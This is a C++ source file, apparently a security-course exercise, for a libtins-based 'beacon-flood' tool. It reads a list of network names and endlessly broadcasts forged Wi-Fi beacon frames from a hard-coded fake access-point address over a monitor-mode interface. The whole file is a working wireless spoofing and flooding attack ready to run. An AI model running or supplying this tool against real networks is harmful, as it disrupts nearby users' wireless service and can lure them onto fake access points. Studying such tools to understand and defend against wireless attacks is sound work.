#include <unistd.h>
#include <list>
#include <tins/tins.h>
#include <fstream>
#include <iostream>

using namespace std;
using namespace Tins;

void usage() {
  cout << "syntax : beacon-flood <interface> <ssid-list-file> << '\n' << sample : beacon-flood mon0 ssid-list.txt" << '\n';
}

int main(int argc, char **argv) {
  if (argc != 3) {
    usage();
    exit(1);
  }

  list<string> ssidList;
  
  ifstream infile(argv[2]);
  string line;
  for(string line; getline(infile, line);) {
    ssidList.push_back(line);
  }
  infile.close();
  
  for (string ssid: ssidList) {
    cout << ssid << '\n';
  }

  list<string>::iterator it = ssidList.begin();

  while (true) {
    RadioTap tap;

    Dot11::address_type ap        = "00:11:22:33:44:55";
    Dot11::address_type broadcast = "ff:ff:ff:ff:ff:ff";
    Dot11Beacon beacon(broadcast, ap);
    beacon.addr4(ap);
    beacon.ssid(*it);
    beacon.ds_parameter_set(1);
    beacon.supported_rates({ 1.0f, 5.5f, 11.0f });
    tap.inner_pdu(beacon);

    PacketSender sender(argv[1]);
    sender.send(tap);
    usleep(1000);

    if (++it == ssidList.end())
      it = ssidList.begin();
  }
}
